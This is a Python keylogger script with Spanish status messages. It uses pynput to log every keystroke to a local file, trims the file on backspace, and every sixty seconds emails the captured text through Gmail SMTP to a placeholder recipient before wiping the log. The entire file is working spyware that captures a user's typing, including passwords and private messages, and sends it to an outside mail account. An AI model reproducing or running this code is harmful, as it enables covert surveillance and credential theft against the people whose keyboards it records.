import sys,logging
import time,datetime
from pynput.keyboard import Listener

wait_seconds=60
timeout=time.time()+wait_seconds 

def TimeOut():   
    global timeout
    if time.time()>timeout:       
        timeout=time.time()+wait_seconds                           
        #print(timeout)
        return True
    else:
        return False
def SendEmail(user,pwd,recipient,subject,body):
    import smtplib
    gmail_user=user
    gmail_pass=pwd
    FROM= user
    TO= recipient if type(recipient) is list else [recipient]
    SUBJECT=subject
    TEXT=body   
    message="""\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM,",".join(TO),SUBJECT,TEXT)   
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_pass)
        server.sendmail(FROM,TO,message)
        server.close()
        print("se envio correctamente")
    except:
        print ("error al mandar correo!") 
def FormatAndSendEmail():
    with open('keylogger.txt','r+') as f:
        actualdate=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read().replace('\n','')                
        data='log capturado a las '+ actualdate + '\n' + data        
        SendEmail('ssssmail.com','password','ddddmail.com',
                  'new log - '+actualdate,data)      
        f.seek(0)
        f.truncate()
        
def key_recorder(key):    
    f=open('keylogger.txt','a')
    keyo=str(key)
    
    if keyo=="Key.enter":
        f.write('\n')
    elif keyo=="Key.space": 
        f.write(" ")
    elif keyo =="Key.backspace":       
        #f.write(keyo.replace(keyo,""))          
        size=f.tell()    # the size... 
        f.truncate(size-1)     
    elif keyo=="Key.alt_l" or keyo=="Key.tab":
        f.write('')  
    elif keyo=="Key.ctrl_l":
        f.write('')    
    elif keyo=="Key.alt_gr":
        f.write('')        
    elif keyo=="'\\x03'":
        f.write('\n\Saliendo del keyloger...')
        f.close()   
        quit()                          
    else:
        print(keyo)                
        f.write(keyo.replace("'",""))
      
    if TimeOut(): 
        print("test")
        FormatAndSendEmail() 
                                   
        #print(timeout)'''
                             
            
with Listener(on_press=key_recorder) as l :
    l.join()
 
      

         
    
    
